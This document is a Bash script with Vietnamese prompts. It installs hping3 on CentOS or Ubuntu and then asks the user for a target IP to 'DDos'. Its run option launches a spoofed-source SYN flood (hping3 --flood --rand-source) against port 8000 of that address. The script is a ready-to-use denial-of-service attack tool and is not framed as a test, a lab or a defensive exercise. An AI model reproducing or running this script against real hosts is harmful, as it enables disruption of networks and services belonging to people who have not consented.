#!/bin/bash
clear
PS3="Chọn hệ điều hành Linux để cài hping3 :"
opt=("Centos" "Ubuntu" "Exit")
select menu in "${opt[@]}"
do
        case $menu in
        "Centos")
        if (`cat /etc/os-release | grep -q 'CentOS'`); then
                echo Hệ điều hành của bạn là : CentOS
                cat /etc/os-release | head -5
                        opt1=("Setup" "Run" "Exit")
                select menu1 in "${opt1[@]}"
                do
                        case $menu1 in
                "Setup")
                        echo " Đang cài đặt Hping3.. "
                        sudo yum install hping3 -y
                ;;
                "Run")
                        printf " Điền IP cần DDos : "
                read n
                hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                ;;
                "Exit")
                exit
                ;;
                esac
                done
        else
                echo Hệ điều hành của bạn không phải CentOS $REPLY
        exit
fi
        ;;
        "Ubuntu")
        if (`cat /etc/os-release | grep -q 'Ubuntu'`); then
                echo Hệ điều hành của bạn là : Ubuntu
                cat /etc/os-release | head -2
                       opt2=("Setup" "Run" "Exit")
                select menu2 in "${opt2[@]}"
                do
                        case $menu2 in
                "Setup")
                        echo " Đang cài đặt Hping3.. "
                        sudo apt-get install hping3 -y
                ;;
                "Run")
                        printf " Điền IP cần DDos : "
                read n
                        hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                ;;
                "Exit")
                exit
                ;;
                esac
                done
        else
                echo Hệ điều hành của bạn không phải Ubuntu $REPLY
        exit
fi
esac
done
